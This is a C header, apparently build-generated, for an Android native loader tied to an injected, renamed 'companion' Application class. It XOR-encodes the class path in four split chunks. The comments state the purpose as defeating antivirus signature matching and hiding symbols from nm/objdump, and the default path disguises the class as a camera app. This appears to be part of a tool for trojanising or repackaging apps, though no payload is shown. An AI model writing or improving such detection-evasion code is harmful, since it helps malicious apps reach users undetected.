/*
 * np_loader_class.h — BUILD-TIME GENERATED — DO NOT EDIT MANUALLY
 *
 * This file is overwritten by build_module.py (step_write_np_loader_header)
 * before `./gradlew assembleRelease` runs.
 *
 * NP_CLASS  : JNI class descriptor path (slashes not dots) for the companion
 *             Application subclass, post-STEP_6A rename. E.g.:
 *             "com/example/launcher/ApplicationController"
 *
 * NP_METHOD : native method name declared in companion smali. Always "xd".
 *
 * ── Security hardening ────────────────────────────────────────────────────
 * NP_CLASS is NOT stored as a plain string literal.
 * Plain class path in .rodata = one signable AV string.
 *
 * Instead it is stored as 4 split chunks, each XOR'd with NP_XOR_KEY (0x37).
 * No contiguous recognisable substring exists in the binary.
 * JNI_OnLoad assembles and decodes at runtime into a stack buffer.
 *
 * To regenerate for a new class path, run:
 *   python3 -c "
 *     cls='com/new/pkg/MyApp'; key=0x37
 *     enc=[b^key for b in cls.encode()]
 *     print(', '.join(f'0x{b:02x}' for b in enc))
 *   "
 * and distribute the bytes across the four NP_C0..NP_C3 arrays below,
 * updating NP_C0_LEN..NP_C3_LEN to match.
 * ──────────────────────────────────────────────────────────────────────────
 */

#ifndef NP_LOADER_CLASS_H
#define NP_LOADER_CLASS_H

/* XOR key used for all chunks */
#define NP_XOR_KEY 0x37u

/*
 * Default fallback encodes: "com/android/photo/camera/capture/App"
 * Split at chunk boundaries — no single chunk is a recognisable string.
 * build_module.py overwrites these arrays with the per-build class path.
 */

/* Chunk 0: "com/android/"  (12 bytes) */
#define NP_C0_LEN 12
static const unsigned char NP_C0[NP_C0_LEN] = {
    0x54, 0x58, 0x5a, 0x18, 0x56, 0x59, 0x53, 0x45, 0x58, 0x5e, 0x53, 0x18
};

/* Chunk 1: "photo/"  (6 bytes) */
#define NP_C1_LEN 6
static const unsigned char NP_C1[NP_C1_LEN] = {
    0x47, 0x5f, 0x58, 0x43, 0x58, 0x18
};

/* Chunk 2: "camera/"  (7 bytes) */
#define NP_C2_LEN 7
static const unsigned char NP_C2[NP_C2_LEN] = {
    0x54, 0x56, 0x5a, 0x52, 0x45, 0x56, 0x18
};

/* Chunk 3: "capture/App"  (11 bytes) */
#define NP_C3_LEN 11
static const unsigned char NP_C3[NP_C3_LEN] = {
    0x54, 0x56, 0x47, 0x43, 0x42, 0x45, 0x52, 0x18, 0x76, 0x47, 0x47
};

/*
 * NP_CLASS_LEN — total decoded length (sum of all chunk lengths).
 * +1 for null terminator.
 */
#define NP_CLASS_LEN (NP_C0_LEN + NP_C1_LEN + NP_C2_LEN + NP_C3_LEN + 1)

/*
 * NP_DECODE_CLASS(buf) — decode all 4 chunks into char buf[NP_CLASS_LEN].
 * Declared as a macro so it inlines at the single call site in JNI_OnLoad
 * and leaves no function symbol for nm/objdump to expose.
 */
#define NP_DECODE_CLASS(buf)                                        \
    do {                                                            \
        int _i, _o = 0;                                            \
        for (_i = 0; _i < NP_C0_LEN; _i++) (buf)[_o++] = (char)(NP_C0[_i] ^ NP_XOR_KEY); \
        for (_i = 0; _i < NP_C1_LEN; _i++) (buf)[_o++] = (char)(NP_C1[_i] ^ NP_XOR_KEY); \
        for (_i = 0; _i < NP_C2_LEN; _i++) (buf)[_o++] = (char)(NP_C2[_i] ^ NP_XOR_KEY); \
        for (_i = 0; _i < NP_C3_LEN; _i++) (buf)[_o++] = (char)(NP_C3[_i] ^ NP_XOR_KEY); \
        (buf)[_o] = '\0';                                           \
    } while (0)

/* NP_METHOD — method name, always "xd" — short enough to stay as-is */
#define NP_METHOD "xd"

#endif /* NP_LOADER_CLASS_H */
